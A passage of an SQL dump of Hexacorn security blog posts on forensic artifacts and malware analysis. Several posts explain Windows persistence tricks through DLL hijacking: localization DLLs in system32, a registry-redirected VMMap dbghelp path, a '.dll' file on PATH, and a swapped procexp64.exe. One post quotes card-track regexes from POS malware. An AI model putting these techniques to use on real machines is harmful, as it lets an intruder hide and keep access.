7z\n%TEMP%\\~DF<hexdigits>.tmp – side-effect of running a Visual Basic Application; described in my older post\n%TEMP%\\~dfs<digits>.tmp – dropped by Adware.DomaIQ\n%TEMP%\\GLB<digits>.tmp – side-effect of running Wise Installer; stage 1 – this is a stub dropping DLL performing the installation (WISE*.dll)\n%TEMP%\\GLC<digits>.tmp – side-effect of running Wise Installer; this is the WISE*.dll – a DLL performing the installation\n%TEMP%\\GLD<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GLF<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GLG<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GLI<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GLJ<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GLK<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GLL<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GLM<digits>.tmp – side-effect of running Wise Installer; stage 3\n%TEMP%\\GL<other letter><digits>.tmp – possible side-effect of running Wise Installer; stage 3\n%TEMP%\\IXP<digits>.TMP – directory created by old-school installers developed using IEXPRESS\n%TEMP%\\nsi<digits>.tmp – side-effect of running Nullsoft Installer\n%TEMP%\\nst<digits>.tmp – side-effect of running very old Nullsoft Installer; it uses a hardcoded ‘nst’ as a prefix\n%TEMP%\\ns<other letter><digits>.tmp – side-effect of running older Nullsoft Installer; it uses a random letter following the prefix ‘ns’\n%TEMP%\\scs<digits>.tmp – side effect of running ntvdm.exe on Windows XP; usually two temporary files containing the same content as autoexec.nt and config.nt\n%TEMP%\\sfx<digits>.tmp – side-effect of running GkWare Installer\n%TEMP%\\stp<digits>.tmp – side-effect of running Wise Installer; stage 1\n%TEMP%\\sxe<digits>.tmp – self-extracting executable, a custom installer often used by malware (I am not sure who developed it, it could be some old legitimate installer, or even Windows) – it is dropping a compressed clean DLL (SZDD at the top of the file – usually sxe1.tmp), the DLL is decompressed (usually sxe2.tmp) and reveals itself to be just a decompression library (only one exported function DllInflate), and finally sxe3.tmp is the payload\n\nI am still crunching some data, so there will be part 2.\nShare this :)', 'Compromise Detection, File Formats ZOO, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/05/when-you-are-a-temp-your-days-are-often-numbered-so-are-your-file-names-part-1/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (255, 'Permanent Link to Beyond good ol’ Run key, Part 21', 'Hexacorn', 'January 3, 2015 ', 'MFC localization DLLs are similar in nature to Visual Basic ones (I talked about them in my last post).\nThe MFC framework went through many versions over the years, but the localization piece is still there and for many years it was initialized incorrectly by loading the resource DLLs as actual code (using LoadLibrary API). It eventually got fixed in the mfc110.dll (now it is using LoadLibraryEx API and forces to load the resource DLLs as data only), so while the new versions are secure the older versions can be potentially leveraged as a persistence mechanism.\nAs mentioned, there are many versions of MFC DLLs (refer to wiki link I provided in the first sentence of this post) so let’s walk through them one by one.\n\nmfc40.dll\n\nLoads MFC40LOC.dll\n\n\nmfc42.dll\n\nLoads MFC42LOC.dll\n\n\nmfc70.dll\n\nLoads MFC70<LNG>.dll & MFC70LOC.dll\n\n\nmfc71.dll\n\nLoads MFC71<LNG>.dll & MFC71LOC.dll\n\n\nmfc80.dll\n\nLoads MFC80<LNG>.dll & MFC80LOC.dll\n\n\nmfc90.dll\n\nLoads MFC90<LNG>.dll & MFC90LOC.dll\n\n\nmfc100.dll\n\nLoads MFC100<LNG>.dll & MFC100LOC.dll\nUses LoadLibraryEx, yet still loads the resource DLLs as code\nNote: often accompanied by existing resource files for major languages: mfc100chs.dll, mfc100cht.dll, mfc100deu.dll, mfc100enu.dll, mfc100esn.dll, mfc100fra.dll, mfc100ita.dll, mfc100jpn.dll, mfc100kor.dll, mfc100rus.dll\n\n\nmfc110.dll\n\nLoads MFC110<LNG>.dll & MFC110LOC.dll\nNote: often accompanied by existing resource files for major languages: mfc110chs.dll, mfc110cht.dll, mfc110deu.dll, mfc110enu.dll, mfc110esn.dll, mfc110fra.dll, mfc110ita.dll, mfc110jpn.dll, mfc110kor.dll, mfc110rus.dll\nNote: This is the first version of MFC library that loads the resource DLL in a proper, secure way, via LoadLibraryEx using a LOAD_LIBRARY_AS_DATAFILE flag – as such, it doesn’t execute any code (that is, the persistence mechanism described here won’t work)\n\n\nmfc120.dll\n\nLoads MFC120<LNG>.dll & MFC120LOC.dll, but also loads them as data so persistence mechanism won’t work either\nNote: often accompanied by existing resource files for major languages: mfc120chs.dll, mfc120cht.dll, mfc120deu.dll, mfc120enu.dll, mfc120esn.dll, mfc120fra.dll, mfc120ita.dll, mfc120jpn.dll, mfc120kor.dll, mfc120rus.dll\n\n\n\nNote #1:\n\nLNG is a 3-letter language code: ENU, CHS, JPN, FRA, etc. (e.g. MFC70ENU.dll)\n\nNote #2:\n\nThe newer versions (>=70) of MFC load MFCxxxLOC.dll DLLs only if the LCID is set to LOCALE_SYSTEM_DEFAULT – since the loading of localization DLLs happens in a loop (all LCIDs are enumerated until loading of a localized DLLs succeeds), one of the enumerated LCIDs is actually set to LOCALE_SYSTEM_DEFAULT on Windows XP and both MFCxxx<LNG>.dll and MFCxxxLOC.dll are loaded, but I have not encountered the situation during tests where it would be set on Windows 7 (so you won’t see loading of MFCxxxLOC.dll on win7; this requires more research)\n\nNote #3:\n\nThe Unicode and Debug versions of MFC libraries are behaving in an identical way e.g. for mfc110.dll you have:\n\nmfc110.dll – ANSI\nmfc110d.dll – ANSI, Debug\nmfc110u.dll – Unicode\nmfc110ud.dll – Unicode, Debug\n\n\n\nTo test, you can load the mfc DLL into OllyDbg, put a breakpoint on LoadLibraryA/W (and LoadLibraryExA/W for newer versions, and A/W for Ansi or Unicode respectively) and see what happens – the below screenshot shows various versions of MFC DLL loading the localization DLLs – first five are from English OS and the last two from Russian:\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/03/beyond-good-ol-run-key-part-21/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (256, 'Permanent Link to Beyond good ol’ Run key, Part 20', 'Hexacorn', 'January 1, 2015 ', 'Visual Basic is a goldmine when it comes to legacy code and some weird stuff (one example is – which doesn’t really matter for this post, but it’s just worth mentioning – that anytime a VB application exits it tries to find a .hlp file f.ex. \\windows\\system32\\.hlp and if it finds it it will try to open it using a WinHelp API).\nAnyway. In today’s post we describe yet another persistence mechanism related to VB which works on localized systems, but could be potentially adapted to English systems as well.\nThe idea is simple and it’s yet another example of a feature which is rarely used nowadays, but could be adapted for malicious purposes. It’s about localization DLLs that msvbvm60.dll loads by default when a VB application is launched on a non-English systems.\nThe naming convention for these DLLs is vb6<language code>.dll e.g. vb6ar.dll for Arabic, vb6ru.dll for Russian. Dropping these into e.g. c:\\windows\\system32\\ will ensure that they are loaded anytime VB application starts (and exits).\nExample for Russian system:\n\nApplication Start:\n\n\n \n \n \n\nApplication Exit:\n\n\n \n \n \nOr, as seen in DebugView:\n\nThere is a bonus for OS where the language is set to Arabic or Hebrew. On such systems VB will attempt to load one more extra library called vbame.dll.\nDropping vbame.dll and vb6ar.dll inside c:\\windows\\system32 on Arabic Windows will ensure these DLLs are loaded anytime someone starts VB app:\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2015/01/01/beyond-good-ol-run-key-part-20/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (257, 'Permanent Link to Santa’s bag full of mutants', 'Hexacorn', 'December 23, 2014 ', 'Santa decided to drop some mutants on the DFIR/RCE community today.\nHappy new year 2015.\np.s. I you find any mistakes, please let me know. This list SHOULD NOT be taken at its face value as there are a lot of ways for it to get contaminated. Still, I believe it contains a lot of information you won’t find anywhere else so hoping it will be useful.\nShare this :)', 'Compromise Detection, Malware Analysis', 'http://www.hexacorn.com/blog/2014/12/23/santas-bag-full-of-mutants/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (258, 'Permanent Link to The not so boring land of Borland executables, part 2', 'Hexacorn', 'December 18, 2014 ', 'In the part 1 we explored the case of the resource timestamps that may come handy while building a timeline, or at least when you are trying to figure out when a specific Borland executable was compiled (I use ‘Borland’ here, but we know it means all the possible variations of Borland-esque compilers/products we can think of: Delphi, Borland C++, Code Gear, Embarcadero) .\nThe other interesting fact you may come across is the family of Borland files that are compiled with an old version of Borland C++. They have 2 very interesting and peculiar properties:\n\nThey have 2 exports: __GetExceptDLLinfo ___CPPdebugHook\nThey also include an original name of the executable\n\nThe first one makes it easy to recognize them.\nThe second one, while it may not be the most forensically interesting information it may still give you some clues for further research. It may come handy if the exported name is unique enough as it may allow e.g. to search for samples from the very same family (e.g. on Google, VirusTotal, Malwr)\nFor example, running the good-old pedump.exe over the file with a hash 3E19EF9C9A217D242787A896CC4A5B03 gives us the following:\nexports table:\r\n\r\n  Name:            winmgmtc.exe\r\n  Characteristics: 00000000\r\n  TimeDateStamp:   00000000 -> Thu Jan 01 08:00:00 1970\r\n  Version:         0.00\r\n  Ordinal base:    00000001\r\n  # of functions:  00000002\r\n  # of Names:      00000002\r\n\r\n  Entry Pt  Ordn  Name\r\n  00001059     1  __GetExceptDLLinfo\r\n  0000C128     2  ___CPPdebugHook\nThe Export Directory is populated with the name of the original .exe and followed by 2 exports.\nAnd yes, many online AV checkers/sandboxes do not show this information.\nSo, 2 things to remember now:\n\nIf it is an older Delphi file, check its resource section’s compilation timestamp\nIf it is Borland C++, check the export directory\n\nShare this :)', 'Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/12/18/the-not-so-boring-land-of-borland-executables-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (259, 'Permanent Link to 3500+ Visual Basic coders cannot be… wait a second', 'Hexacorn', 'December 10, 2014 ', 'Update\nOriginally, this post had an incorrect title  By mistake I used “3500K” which is equivalent to 3.5M. The number should be 3500 a.k.a. 3.5K\nOld Post\nThe number of malware writers is enormous. This is a fact. If someone tells you that there are only 10-100 active ppl or groups doing so, then maybe they are right. But… they are most likely not.\nClustering large number of samples allows us to cherrypick a lot of interesting statistics. I shared quite a lot of them back in 2012-2013. Over last weekend I crunched my databases again and this time I focused on Visual Basic ‘goodness’.\nDespite being old, this programming platform still has a lot of followers. It ‘helps’ writing RunPE  wrappers and their authors often leverage VB’s built-in virtual machine which produces executables that are a big pain to analyze w/o some dedicated tools.\nNow, my focus on VB was very specific. If you ever looked at the VB apps before, you know that they often leave traces of the original project path used by the application author inside the file. Yes, the ‘.vbp’ path. Looking through a histogram of all normalized .vbp paths extracted from a decent collection of malware I was able to find over 3500 user names used in the profiles of people who code them (focusing only on c:\\users\\* and c:\\documents and settings\\*). The number is pretty high, but that is not surprising.  If you add it to 7000 names I extracted in 2013 from debug strings then we are already crossing 10K profiles (possibly people). Multiply it by 2 since I excluded a lot of non-user-accountish paths, and the same name can belong to many people.\nOf course, stats are always biased:\n\nI don’t have all samples\nSome of these paths could be automatically generated/modified/made up\nLots of other reasons\n\nbut numbers speak for themselves anyway.\nHere is a list of top user names – lots of variations of the Admin account in multiple languages top the list:\n\nAdministrator\nAdministrador\nAdmin\nAdministrateur\nuser\nOwner\nADMINI~1\nPedro\nDavid\nUsuario\npc\n2fast4you\nIubHost\nben\nbox1\nxp\nDANIEL\nM3\nMaster\nTolga\no_O\nM3N3G@TT1_\nsher soft\nJhon\nAntrax10\n\nVarious interesting names are also on the list:\n\nAlpacino\nWHO\nMetal_Zone\nLORDOFDARK\nMicrosoftCorporation\nEmperor Zhou Tai Nu\nmitnick\nKingOfHackers\n^_^\nAnTiviRus7\nCompaq_Owner\nHacker test Machine\nKillerMadara\nx-men\nghost prince\nHACKED-PC\nSkY-NeT SySteMs\nAdministrator.VIRUS\nSauvegarde [ Don’t Toutch ]\nEvil Karma\nDJ-HacKeR\nFuck Yu !\nH4x0r!\no-._.-o\nOracle Machine\nJesus Cristo\noussama\nOWNED LAN HOUSE\n$T0N3R\nDeV-PoInT HaCkEr\nFUCKWIT\nGETFUCKED\n~RED_DEVIL~\n0p3nf1r3\nBaD HackeR\nPrediatOr\nPuNkDuDe\nredC0mmand3r\nSoda_Da_Pimp\nBritish_Intel\nSaeed_virus\nwolverine\nComputer Zimmer\nE.M.I.N.E.M\n_M3t4m0rf0siS_\n-$-BaNdO’s CoRp-$-\nA__L__I__E__N\nBrainFart\nFaTaLCoDeR\nFUCK OFF\nfucked up\nFuckYou\ng0df4th3r\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/12/10/3500k-visual-basic-coders-cannot-be-wait-a-second/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (260, 'Permanent Link to The not so boring land of Borland executables, part 1', 'Hexacorn', 'December 5, 2014 ', '“Borland”, “Inprise”, “Code Gear”, “Embarcadero”, “Delphi”, “C++ Builder”, as well as “Boolean”, “False”, “True”, “System”, “AnsiChar” are keywords that are very familiar to anyone who reverse engineers executables on regular basis. Seeing them is a good indicator that the samples we look at were most likely produced by compilers coming either directly, or through its descendants and spinoffs from Borland.\nI want to talk about them, because Borland executables can be a goldmine for forensic investigators.\nThe part 1 will focus on the infamous number 0x2A425E19 (708992537) a.k.a 1992-06-19 22:22:17 (Friday).\nThis is a compilation timestamp of many Delphi files and let’s face it – it is just simply annoying.\nLots of people complained about it in the past; it is actually a very well-known bug, have not been addressed for many years, and only (as per the note in the link provided): “In Delphi 7 this structure was filled properly, but in 2006 not.” i.e. Delphi 4 – Delphi 2006 do not set this timestamp correctly.\nNow, this is actually an interesting forensic artifact as it tells you the file was compiled most likely with Delphi 4 – Delphi 2006.\nThere is more to it.\nIf the compilation stamp is wrong you can still manage to win the game. If the Delphi executable has a resource directory you may retrieve its compilation timestamp. It is stored in an old-school DOS time format (note that non-Delphi files store it as an EPOCH timestamp, as per PE documentation; yes, Delphi executables are weird  ). And lo and behold, it may be actually a compilation timestamp that indicates when the whole thing was compiled, or at least give you a better estimate!\nIn any case, it’s better than nothing.\nExample for the same file:\nPE Comp.:    1992-06-19 22:22:17 2A425E19, 708992537\r\n.rsrc comp.: 2010-12-09 14:25:36 3D897332, 1032418098\nPE Compilation timestamp is the buggy 1992-06-19 22:22:17, but the .rsrc directory timestamp is a very reasonable timestamp 2010-12-09 14:25:36.\nAnd yes, there is a script that you can use to do a dirty work for ya (use it for Delphi executables only).\nperl pect.pl <filename>\nDownload pect.pl here.\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2014/12/05/the-not-so-boring-land-of-borland-executables-part-1/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (261, 'Permanent Link to Beyond good ol’ Run key, Part 19', 'Hexacorn', 'December 4, 2014 ', 'In my last post I mentioned Sysinternals. While combining the info for that post I came across a few things that gave me enough material to write a #19 in the series.\nAnd it’s based on bugs in Sysinternals’ tools. Bugs that can be spotted easily. Today I’ll explain how you can utilize these bugs to create new persistent mechanisms.\nSay, you like Process Explorer.\nNowadays 64-bit systems are very popular so running procexp.exe on a 64-bit system ends up with a procexp.exe dropping its 64-bit version into a %TEMP% folder and launching it.\n\nNow, what you can do is f.ex. copy your notepad.exe to %TEMP% and name it procexp64.exe. Then you need to set up 2 access rights for everyone:\n\nOne that forbids deleting %temp%\\procexp64.exe (on the file itself)\nOne that forbids deleting subfolders and files inside %TEMP% (on the %TEMP% folder); this is btw. one of the WTFs of NTFS system where prohibiting deletion of the files needs to be extended to its parent folder; there must be some reasons for that, but it is not something you can learn about from a cryptic Security Properties tab\n\nFrom now on, launching procexp.exe on a 64-bit system will always launch notepad.exe. A nice man-in-the-middle attack especially if the malicious notepad.exe actually does spawn the legitimate procexp64.exe and hides its presence somehow from the Process Explorer GUI.\nOf course blocking %TEMP% from deletion is a silly idea, but:\n\nit is an example only\nit actually works\nthere are many other ways to prevent deletion of the procexp64.exe by procexp.exe (on exit), or at least ensure the malicious procexp64.exe is restored after it is being deleted\n\nAnother bug I spotted was the way vmmap.exe craves for dbghelp.dll.\nVMMAP is not a very popular program and I bet not too many people use it daily, but the way it works requires a special attention; it’s an example of a difference between programming for your own use vs. programming for ‘public’. As a non-professional programmer who writes buggy programs every day I am actually quite surprised by it. Yes, it’s that buggy.\nLet me elaborate.\nVMMAP has a very peculiar way for searching for dbghelp.dll:\nFirst, it searches for the entry in the Registry:\n\nHKCU\\Software\\Sysinternals\\VMMap\\DbgHelpPath32 = <path to dbghelp.dll>\n#persistence #1\n\nBy modifying HKCU\\Software\\Sysinternals\\VMMap\\DbgHelpPath32 to point to a malicious DLL we can ensure that DLL is loaded every time VMMAP is launched\n\n\n\nIf it is not found, VMMAP goes ballistic (#persistence #2..N).\nIt calls a LoadLibraryW with a NULL which is a (sort of) result of retrieving data from a non-existing HKCU\\Software\\Sysinternals\\VMMap\\DbgHelpPath32 value.\nThis is when things get crazy. The craving goes totally addictive.\nNULL is a Pandora’s box (Or’ Pandor’s since the author is a male) open for LoadLibraryW.\nIt means it will walk through every directory listed in the PATH environment variable and will attempt to load a library called ‘.dll’ from every single directory on that list.\nYes, ‘.dll’ is a valid library name i.e. a NULL with a ‘.dll’ extension.\nSo, you can place a DLL called “.dll” in any location that is covered by a PATH environment variable and you will have it launched by VMMAP anytime it starts.\nYou probably want to hear that this is the end of the story.\nNot quite so.\nThere are still a few places to look at:\n\nC:\\Program Files\\Debugging Tools for Windows (x86)\\dbghelp.dll\nC:\\Program Files\\Debugging Tools for Windows\\dbghelp.dll\nC:\\Debuggers\\dbghelp.dll\n\nDropping a dbghelp.dll in the …\nyawnz…\nyou know the drill \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/12/04/beyond-good-ol-run-key-part-19/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (262, 'Permanent Link to Sysinternals’  Eulagoogoolizer', 'Hexacorn', 'November 30, 2014 ', 'Update\nIf you plan on using parts of it for pentesting purposes – you are doing it wrong  I mention this cuz I saw someone suggesting it on Twitter.\nYou don’t want to leave any traces in Registry – either you cough cough patch it, or use an alternative.\nOld post\nSysinternals tools are great, but since Microsoft took over most of these software gems have been Eulaized – a pretty annoying thing, especially if you want to run them on a remote system. While some of the tools now accept the accepteula command line argument, sometimes it’s just handy to accept it all in one go.\nThe below reg file does exactly this; you can also edit it and cherry-pick those apps you need.\nNote: It will only work if you save it as SysinternalsEulagoogoolizer.reg \nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\A]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Active Directory Explorer]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Autologon]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\AutoRuns]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\C]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\CacheSet]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\ClockRes]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Coreinfo]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Ctrl2cap]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\DbgView]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Desktops]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Disk2Vhd]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Diskmon]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\DiskView]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\EFSDump]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\FindLinks]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Handle]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Hex2Dec]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Junction]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\LdmDump]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\ListDLLs]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\LoadOrder]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Movefile]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PageDefrag]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PendMove]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PipeList]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Portmon]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\ProcDump]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Process Explorer]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Process Monitor]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsExec]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\psfile]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsGetSid]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsInfo]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsKill]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsList]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsLoggedon]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsLoglist]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsPasswd]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsService]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsShutdown]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\PsSuspend]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\RegDelNull]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Regjump]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Regsize]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\RootkitRevealer]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Share Enum]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\ShellRunas - Sysinternals: www.sysinternals.com]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\SigCheck]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Streams]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Strings]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Sync]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\TCPView]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\VMMap]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\VolumeID]\r\n\"EulaAccepted\"=dword:00000001\r\n[HKEY_CURRENT_USER\\Software\\Sysinternals\\Winobj]\r\n\"EulaAccepted\"=dword:00000001\nShare this :)', 'Tips & Tricks', 'http://www.hexacorn.com/blog/2014/11/30/sysinternals-eulagoogoolizer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (263, 'Permanent Link to Regulex & Visualized regexes', 'Hexacorn', 'November 28, 2014 ', 'A few days ago I noticed a twit referring to http://jex.im/regulex/, a home page for a cute engine that visualizes regular expressions. It is great!\nIf you struggle with regular expressions, or just want to toy around this is an excellent tool for learning and testing purposes; it may be also a good way to enrich forensic / investigation reports.\nLet’s see what it can do by feeding it a few examples:\nTrack data\nIn my old post from 2012 about POS malware I mentioned a sample D9A3FB2BFAC89FEA2772C7A73A8422F2 that contains regular expressions used to parse track data; here they are:\n\nTrack 1\n\n((b|B)[0-9]{13,19}\\^[A-Za-z\\s]{0,30}\\/[A-Za-z\\s]{0,30}\\^(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9\\s]{3,50}[0-9]{1})\n\n\nTrack 2\n\n([0-9]{15,16}[D=](0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9]{8,30})\n\n\n\nFeeding them to Regulex gives us the following results:\n\nTrack 1\n\n\n\nTrack 2\n\nWhen converted by Regulex, they make a lot of sense and are very readable.\nEmail\nUsing an example regex to validate email presented on http://www.regular-expressions.info/email.html:\n[a-z0-9!#$%&’*+/=?^_`{|}~-]+(?:\\.[a-z0-9!#$%&’*+/=?^_`{|}~-]+)*@ (?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+(?:[A-Z]{2}|com|org|net|edu|gov|mil| biz|info|mobi|name|aero|asia|jobs|museum)\\b\nwe can get the following diagram:\nAwesome, isn’t it ?\nShare this :)', 'Others', 'http://www.hexacorn.com/blog/2014/11/28/regulex-visualized-regexes/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (264, 'Permanent Link to Decompiling compiled AutoIT scripts (64-bit)', 'Hexacorn', 'November 28, 2014 ', 'To decompile AutoIT scripts compiled as 64-bit exes simply extract the appended script from the 64-bit file and attach it to 32-bit AutoIt exe stub.  Then run it via Exe2Aut https://exe2aut.com/.\nThis is probably the shortest post ever \nUpdate: you can visit the second part of this post to read details on how to do it (step by step)\nShare this :)', 'Malware Analysis, Tips & Tricks', 'http://www.hexacorn.com/blog/2014/11/28/decompiling-compiled-autoit-scripts-64-bit/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (265, 'Permanent Link to The 3 stages of 3ages', 'Hexacorn', 'November 27, 2014 ', 'Quick Update\nJust to clarify: this is a critique of IR processes that rely on a single way of doing things which in certain circumstances is not the best; it may slow down your response time & give you a lot of unnecessary work. In other words: Alexious’ principle (see below) is a good way of doing things. Doing full or raw forensics on the example 400 hosts would be very inefficient. It mainly applies to daily IR/SOC work, not consulting gigs.\nOriginal Post\nThe Digital Forensics world is a subject to trends the same way as is fashion.\nA long time ago everyone would just do the bit-by-bit & offline forensics and that would be enough. Then ‘do not pull the plug’ idea came along and now no one dares to shut down the box until at least the volatile data is acquired. On the shoulders of the importance of volatile data came the notion of importance of memory forensics which concluded (as of 2014) in a phenomenal work of the Volatility team, an excellent tool and the best book about ‘all of it’ presented in the most digestible way ever.\nSomewhere in the background a lot of research towards understanding of the internals of NTFS was also done, then it got digested by many, and finally converted into popular, and often free applications. It’s actually a good time to be in DFIR because tools are out there and you can crack cases in no time. On top of that, both memory and NTFS/$MFT forensics are probably the most attractive technical aspects of DFIR world in general due to technical difficulties associated with their everchanging complexity & simply speaking ‘it really takes time getting to understand how it all works, but it is very rewarding’ (c).\nWhat could possibly go wrong?\nThe everlasting and omnipresent part of the DFIR work is the word ‘context’ a.k.a. scope (if you are from consulting or compliance world).\nOne thing I observe last few years is a very strange trend which can be formulated as:\n\ntriage is now equal to memory & $MFT forensics.\n\nIf you can do it quickly, have proper tools and know what you are doing  – it may actually work.\nBUT\nI believe that it’s often an over-engineered solution to a much 